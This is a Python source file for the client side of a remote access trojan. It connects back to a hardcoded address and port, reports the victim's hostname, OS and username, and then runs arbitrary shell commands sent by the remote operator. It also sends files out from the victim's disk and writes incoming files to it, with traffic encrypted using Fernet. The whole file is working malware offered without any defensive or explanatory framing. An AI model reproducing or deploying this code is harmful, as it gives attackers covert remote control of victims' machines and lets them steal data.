import subprocess
import os
import shutil
import sys
import time
import socket
import json
import pyscreeze
import platform
import ctypes
from io import StringIO, BytesIO
from cryptography.fernet import Fernet


HOST = "192.168.1.37"
PORT = 6666
BUFF = 1024


def connect():
    global objSocket, objEncryptor
    while True:
        try:
            objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            objSocket.connect((HOST, PORT))
        except socket.error:
            time.sleep(5)
        else:
            break


def send_client_info():
    global objEncryptor, objSocket
    arrClientInfo = [socket.gethostname()]
    strPlatform = f"{platform.system()} {platform.release()}"
    arrClientInfo.extend([strPlatform, os.environ["USERNAME"]])

    objSocket.send(json.dumps(arrClientInfo).encode())
    objEncryptor = Fernet(objSocket.recv(BUFF))


recv = lambda buffer: objEncryptor.decrypt(objSocket.recv(buffer))
send = lambda data: objSocket.send(objEncryptor.encrypt(data))

def recvall(buffer):
    bytData = b""
    while len(bytData) < buffer:
        bytData += objSocket.recv(buffer)
    return objEncryptor.decrypt(bytData)
def sendall(data):
    bytEncryptedData = objEncryptor.encrypt(data)
    intDataSize = len(bytEncryptedData)
    send(str(intDataSize).encode())
    time.sleep(0.2)
    objSocket.send(bytEncryptedData)

def receive(data):
    if not os.path.isfile(data):
        send(b"[-] Target file not found!")
        return

    with open(data, "rb") as objFile:
        sendall(objFile.read())

def download(data):
    intBuffer = int(data)
    file_data = recvall(intBuffer)
    strOutputFile = recv(BUFF).decode()
    print(strOutputFile)
    try:
        with open(strOutputFile, "wb") as objFile:
            objFile.write(file_data)
        response = "[+] Done!".encode()
    except Exception as e:
        print(e)
        response = "[-] Path is protected/invalid!".encode()
    return response

def upload(data):
    response = b""
    if not os.path.isfile(data):
        response = b"[-] Target file not found!"
    else:
        with open(data, "rb") as objFile:
            response = (objFile.read())  # Send Contents of File
    return response

def run():
    while True:
        strCurrentDir = os.getcwd()
        order = recv(BUFF).decode()
        print(order)
        bytResponse = b""
        if order == "goback":
            os.chdir(strCurrentDir)
            bytResponse = f"\n{os.getcwd()}>".encode()
        elif order == "exit" or order == "quit":
            send("[+] Process is being terminated...")
            time.sleep(3)
            objSocket.close()
        elif order[:2] == "cd":
            if os.path.exists(order[3:]):
                os.chdir(order[3:])
                bytResponse= f"[+] Changing working directory to {os.getcwd()}>".encode()
            else:
                bytResponse = "[-] Path not found!".encode()

        elif order[:4] == "send":
            bytResponse = download(order[4:])

        elif order[:4] == "recv":
            bytResponse = upload(order[4:])


        elif len(order) > 0:
            objCommand = subprocess.Popen(order, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE, shell=True)
            strOutput = objCommand.stdout.read() + objCommand.stderr.read()
            bytResponse = strOutput

        else:
            bytResponse = b"Error!"

        sendall(bytResponse)





connect()
send_client_info()
run()